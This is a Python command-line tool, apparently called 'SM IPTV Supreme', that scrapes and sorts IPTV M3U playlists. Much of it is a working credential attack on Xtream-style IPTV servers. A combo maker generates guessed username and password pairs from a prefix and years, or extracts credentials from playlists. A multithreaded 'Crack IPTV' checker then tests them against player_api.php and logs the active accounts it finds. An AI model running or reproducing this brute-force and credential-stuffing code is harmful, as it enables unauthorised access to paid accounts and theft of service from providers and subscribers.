import requests
import os
import re
import concurrent.futures
import threading
import json
import subprocess
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live

console = Console()

# --- Configurations ---
OUTPUT_DIR = "output"
ALL_SOURCE_TXT = "allsource.txt"
ALL_SOURCE_M3U = "allsource.m3u"
CRACK_FILE = "crack.txt"
COMBO_FILE = "iptv_combo.txt"

class SM_IPTV_Supreme:
    def __init__(self):
        self.hits = 0
        self.bad = 0
        self.checked = 0
        self.lock = threading.Lock()
        os.makedirs(OUTPUT_DIR, exist_ok=True)

    def banner(self):
        os.system('clear')
        banner = """
[bold cyan]╔══════════════════════════════════════════════════════════════╗
║                ⚡ SM IPTV CUSTOMIZE SUPREME ⚡               ║
║           [white]Final Edition | Auto-Sync | Advance Crack[/white]         ║
╚══════════════════════════════════════════════════════════════╝[/bold cyan]
"""
        console.print(banner)

    def github_sync(self):
        """Auto updates to GitHub after every action"""
        if os.path.exists(".git"):
            console.print("[dim][*] Updating GitHub Repository...[/dim]")
            subprocess.run("git add . && git commit -m 'Auto-Update SM IPTV' && git push -u origin main --force", shell=True, capture_output=True)
            console.print("[green]✔ GitHub Synced Successfully.[/green]")
        else:
            console.print("[red][!] Git not initialized in this folder.[/red]")

    def parse_m3u(self, urls):
        """Extracts Name, URL, and Category from M3U"""
        all_channels = []
        for url in urls:
            try:
                r = requests.get(url.strip(), timeout=15).text
                matches = re.findall(r'#EXTINF:.*?(?:group-title="(.*?)")?.*?,(.*?)\n(http.*?)(?:\n|$)', r)
                for cat, name, link in matches:
                    cat = cat if cat else "Uncategorized"
                    all_channels.append({"cat": cat, "name": name.strip(), "link": link.strip()})
            except:
                console.print(f"[red][!] Error loading: {url}[/red]")
        return all_channels

    # --- 1. All Channel ---
    def all_channel_export(self, urls):
        channels = self.parse_m3u(urls)
        path = os.path.join(OUTPUT_DIR, "all_channels.m3u")
        
        existing_links = set()
        if os.path.exists(path):
            with open(path, "r") as f: existing_links = set(re.findall(r'http[^\s]+', f.read()))

        with open(path, "a", encoding="utf-8") as f:
            if not existing_links: f.write("#EXTM3U\n")
            for ch in channels:
                if ch['link'] not in existing_links:
                    f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
                    existing_links.add(ch['link'])
        
        console.print(f"[green]✔ Total {len(channels)} Channels Processed.[/green]")
        self.github_sync()

    # --- 2. Custom Channel Folder (Dynamic Serial) ---
    def custom_folder_export(self, urls):
        channels = self.parse_m3u(urls)
        categories = sorted(list(set([ch['cat'] for ch in channels])))
        
        console.print("\n[bold yellow]Available Categories (Select Numbers):[/bold yellow]")
        for i, cat in enumerate(categories, 1):
            print(f"{i}. {cat}")
        
        selection = input("\nEnter Serial (e.g., 125): ")
        selected_indices = [int(i)-1 for i in selection if i.isdigit() and 0 < int(i) <= len(categories)]

        for idx in selected_indices:
            cat_name = categories[idx]
            safe_name = "".join([c for c in cat_name if c.isalnum() or c in (' ', '_')]).strip()
            cat_file = os.path.join(OUTPUT_DIR, f"{safe_name}.m3u")
            
            existing_links = set()
            if os.path.exists(cat_file):
                with open(cat_file, "r") as f: existing_links = set(re.findall(r'http[^\s]+', f.read()))

            with open(cat_file, "a", encoding="utf-8") as f:
                if not existing_links: f.write("#EXTM3U\n")
                for ch in channels:
                    if ch['cat'] == cat_name and ch['link'] not in existing_links:
                        f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
                        existing_links.add(ch['link'])
            console.print(f"[green]✔ Category '{cat_name}' Updated.[/green]")
        self.github_sync()

    # --- 3. Source Code Copy ---
    def source_copy(self):
        url = input("Enter M3U Link: ")
        try:
            data = requests.get(url.strip()).text
            with open(ALL_SOURCE_TXT, "a", encoding="utf-8") as f:
                f.write(f"\n--- {datetime.now()} ---\n{data}\n")
            console.print(f"[green]✔ Source saved to {ALL_SOURCE_TXT}[/green]")
        except: console.print("[red]Failed to fetch.[/red]")

    # --- 5. Crack IPTV (Checker) ---
    def check_worker(self, combo):
        try:
            base = combo.split("/get.php")[0]
            api = f"{base}/player_api.php?{combo.split('?')[1]}"
            r = requests.get(api, timeout=10).json()
            
            if r.get("user_info", {}).get("status") == "Active":
                user = r["user_info"]
                exp = user.get("exp_date")
                exp_date = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "Never"
                
                # Channel Count Check
                live_url = f"{api}&action=get_live_categories"
                ch_count = len(requests.get(live_url, timeout=5).json())
                
                res = f"Link: {combo} | Exp: {exp_date} | Channels: {ch_count}"
                with self.lock:
                    self.hits += 1
                    with open(CRACK_FILE, "a") as f: f.write(res + "\n")
                console.print(f"[bold green][HIT] {res}[/bold green]")
        except: pass

    # --- 6. Combo Maker (Pattern & Custom) ---
    def combo_maker_menu(self):
        self.banner()
        print("1. Auto Make (Pattern Guessing)")
        print("2. Custom (Extract from M3U)")
        c = input("\nChoice: ")
        
        if c == "1":
            link = input("Enter 1 Valid Xtream Link: ")
            prefix = input("Enter Username Prefix (e.g., Jahid): ")
            try:
                host = re.search(r'(http://[^\s/:]+:\d+)', link).group(1)
                patterns = ["123", "1234", "2024", "2025", "@123", "2026"]
                combos = set()
                for i in range(2023, 2027):
                    u = f"{prefix}{i}"
                    for p in patterns:
                        combos.add(f"{host}/get.php?username={u}&password={u}&type=m3u_plus")
                        combos.add(f"{host}/get.php?username={u}&password={prefix}{p}&type=m3u_plus")
                with open(COMBO_FILE, "w") as f:
                    for line in combos: f.write(line + "\n")
                console.print(f"[green]✔ {len(combos)} Pattern combos saved in {COMBO_FILE}[/green]")
            except: print("Invalid Link Format.")
            
        elif c == "2":
            path = input("Enter M3U File Path: ")
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    matches = re.findall(r'(http://[^\s/:]+:\d+)/get\.php\?username=([^\s&]+)&password=([^\s&]+)', f.read())
                    unique = set([f"{h}/get.php?username={u}&password={p}&type=m3u_plus" for h, u, p in matches])
                    with open(COMBO_FILE, "w") as out:
                        for line in unique: out.write(line + "\n")
                console.print(f"[green]✔ {len(unique)} Combos Extracted Successfully.[/green]")

    def menu(self):
        while True:
            self.banner()
            print("1. All Channel (Update/Append)")
            print("2. Custom Channel Folder (Dynamic Serial)")
            print("3. Source Code Copy (to allsource.txt)")
            print("4. Source All (GitHub Sync)")
            print("5. Crack IPTV (Scan & Validate)")
            print("6. Combo Maker (Auto/Custom)")
            print("0. Exit")
            
            opt = input("\n[>] Choice: ")
            if opt == "1": self.all_channel_export(input("Enter M3U Links: ").split(","))
            elif opt == "2": self.custom_folder_export(input("Enter M3U Links: ").split(","))
            elif opt == "3": self.source_copy()
            elif opt == "4": self.github_sync()
            elif opt == "5":
                p = input("Combo Path: ")
                if os.path.exists(p):
                    with open(p, "r") as f: links = f.read().splitlines()
                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex: ex.map(self.check_worker, links)
            elif opt == "6": self.combo_maker_menu()
            elif opt == "0": break
            input("\nPress Enter...")

if __name__ == "__main__":
    SM_IPTV_Supreme().menu()
